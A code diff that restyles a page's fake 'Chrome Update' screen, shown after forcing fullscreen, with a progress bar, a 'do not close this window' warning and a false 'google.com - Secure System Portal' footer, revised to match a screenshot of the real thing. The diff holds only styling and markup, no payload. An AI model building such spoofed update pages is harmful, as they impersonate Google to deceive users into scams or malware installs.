@@ -9,7 +9,7 @@
     margin: 0;
     padding: 0;
     background: #f8f9fa;
-    font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
     color: #1a1a1a;
     overflow: hidden;
   }
@@ -102,24 +102,39 @@
     display: flex;
   }
 
-  /* --- UPDATED UPDATE BOX STYLING --- */
+  /* --- REVISED UPDATE BOX TO MATCH SCREENSHOT --- */
   .update-box {
     background: #ffffff;
-    padding: 48px 40px;
-    border-radius: 12px;
-    box-shadow: 0 8px 32px rgba(0,0,0,0.08), 0 2px 8px rgba(0,0,0,0.04);
-    max-width: 480px;
+    padding: 64px 56px;
+    border-radius: 8px;
+    box-shadow: 0 2px 16px rgba(0,0,0,0.1);
+    max-width: 440px;
     width: 90%;
-    text-align: left;
-    border: 1px solid #e8eaed;
+    text-align: center;
+    border: none;
+  }
+
+  .update-title {
+    color: #1a73e8;
+    font-size: 2rem;
+    font-weight: 400;
+    margin: 0 0 16px 0;
+    letter-spacing: -0.5px;
+  }
+
+  .update-subtitle {
+    color: #5f6368;
+    font-size: 1rem;
+    margin: 0 0 24px 0;
+    font-weight: 400;
   }
 
   .progress-bar {
     width: 100%;
     height: 4px;
-    background: #e8eaed;
+    background: #dadce0;
     border-radius: 2px;
-    margin: 24px 0;
+    margin: 0 0 24px 0;
     overflow: hidden;
   }
 
@@ -130,7 +145,21 @@
     transition: width 0.3s ease-out;
     border-radius: 2px;
   }
-  /* ---------------------------------- */
+
+  .update-message {
+    color: #5f6368;
+    font-size: 0.9rem;
+    margin: 0 0 20px 0;
+    font-weight: 400;
+  }
+
+  .update-footer {
+    color: #3c4043;
+    font-size: 0.85rem;
+    margin: 0;
+    font-weight: 400;
+  }
+  /* ---------------------------------------------- */
 </style>
 </head>
 <body>
@@ -153,15 +182,15 @@
   <!-- Fake Content View (Shown after fullscreen) -->
   <div class="fake-content" id="fake-view">
     <div class="update-box">
-      <h1 style="color: #202124; font-size: 1.5rem; font-weight: 500; margin: 0 0 8px 0; letter-spacing: -0.3px;">Chrome Update</h1>
-      <p style="color: #5f6368; font-size: 0.95rem; margin: 0 0 24px 0; line-height: 1.5;">Installing critical security patches...</p>
+      <h1 class="update-title">Chrome Update</h1>
+      <p class="update-subtitle">Installing critical security patches...</p>
       
       <div class="progress-bar">
         <div class="progress-fill" id="progress"></div>
       </div>
       
-      <p style="color: #5f6368; font-size: 0.85rem; margin: 16px 0 8px 0;">Please do not close this window</p>
-      <p style="color: #202124; font-size: 0.8rem; margin: 0; font-weight: 500;">google.com - Secure System Portal</p>
+      <p class="update-message">Please do not close this window</p>
+      <p class="update-footer">google.com - Secure System Portal</p>
     </div>
   </div>
 
